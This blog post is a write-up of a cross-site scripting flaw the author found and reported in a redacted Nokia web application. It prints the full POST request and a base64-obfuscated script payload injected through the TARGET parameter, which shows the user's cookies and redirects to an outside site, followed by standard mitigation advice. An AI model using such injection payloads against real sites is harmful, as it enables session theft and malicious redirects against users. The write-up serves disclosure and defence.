---
layout: post
title: Nokia XSS WriteUP
---

# The Chronicles of a Cross-Site Scripting (XSS) Vulnerability
![](https://hithmast.github.io/images/xss.jpg)
## Prelude to Discovery

As a curious security enthusiast, I set out on a digital expedition to explore the inner workings of **https://redacted.com**. Little did I anticipate that this journey would unveil a hidden treasure trove - a vulnerability that could potentially compromise user data and tarnish the application's integrity. The vulnerability, a Cross-Site Scripting (XSS) flaw, revealed a critical oversight that begged for attention.

## Unraveling the Payload

The heart of this vulnerability lay in the artful crafting of a payload, a carefully concocted string of characters that could manipulate the very fabric of the application. The payload danced within the confines of the **TARGET** parameter in a POST request, like a silent whisper waiting to be unleashed.

```plaintext
TYPE=33554433&REALMOID=06-85c1bf1c-4c45-4e33-a396-e3c5954a2b66&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=$SM$8Tmx7I3fjX%2fpvbLJxP1%2bYKCn%2f%2fhkBCuK%2fC3ufg4zicmwN5Am%2bfChNVQgafvDS3wf&TARGET=\"--><script>eval(atob(\'YWxlcnQoJ1hTUyBCeSBBbGkgRW1hcmEnKTthbGVydCgnRG9tYWluOiAnK2RvY3VtZW50LmRvbWFpbik7YWxlcnQoJ1lvdXIgQ29va2llczpcbicrZG9jdW1lbnQuY29va2llKTt0b3AubG9jYXRpb24uaHJlZj0naHR0cDovL2V4YW1wbGUuY29tJzs=\'))</script>'
```

## The Payload's Mischief

```
\"--><script>eval(atob(\'YWxlcnQoJ1hTUyBCeSBBbGkgRW1hcmEnKTthbGVydCgnRG9tYWluOiAnK2RvY3VtZW50LmRvbWFpbik7YWxlcnQoJ1lvdXIgQ29va2llczpcbicrZG9jdW1lbnQuY29va2llKTt0b3AubG9jYXRpb24uaHJlZj0naHR0cDovL2V4YW1wbGUuY29tJzs=\'))</script>
```

This potent payload, once injected into the **TARGET** parameter, wielded the ability to spring into action upon an unsuspecting victim's visit. It started innocently enough, alerting my name and the domain URL. Yet, this was merely the prelude to its grand finale. With an audacious flourish, the payload executed a script that decoded and executed further instructions.

The final act of this payload redirected users to an external site, **example.com**, under the attacker's control. This sequence of events demonstrated the vulnerability's potential to compromise user data, deceive users with misleading content, or launch more sinister attacks.

## The Source of Vulnerability

The root cause of this XSS vulnerability lay in the application's inadequate input validation and sanitation. The absence of stringent measures allowed this nefarious payload to infiltrate and manipulate the application's behavior, emphasizing the critical need for robust security mechanisms.

## Thwarting the Threat: Mitigation Strategies

To quell this vulnerability's menacing potential, several strategic measures are advised:

1. **Impeccable Input Sanitization**: Enhance input validation and sanitation procedures to neutralize malicious payloads before they infiltrate the application.

2. **Fortify with CSP**: Implement a comprehensive Content Security Policy (CSP) to control script execution sources and protect against unauthorized scripts.

3. **Encode for Defense**: Encode user-generated content to prevent script execution and bolster the application's defenses against similar attacks.

4. **Safeguard through Audits**: Conduct regular security audits and vulnerability assessments to ensure vigilant protection against evolving threats.

5. **Vigilance in Validation**: Maintain rigorous validation of user inputs, especially those used in dynamic content generation.

## Epilogue: A Call to Action

Armed with this newfound knowledge, I have alerted Nokia's security team to the presence of this vulnerability. My aim is to contribute to the safeguarding of user data and the fortification of the application's defenses. Through this narrative, I hope to underscore the urgency of addressing XSS vulnerabilities and fostering a safer digital landscape for all.

In the tapestry of digital security, every discovered vulnerability serves as a catalyst for growth, learning, and a resolute commitment to shield our online realms from harm.

## Resources
[eval function](https://www.w3schools.com/jsref/jsref_eval.asp)
[atob function](https://www.w3schools.com/jsref/met_win_atob.asp)
[Cyber Chef](https://gchq.github.io/CyberChef)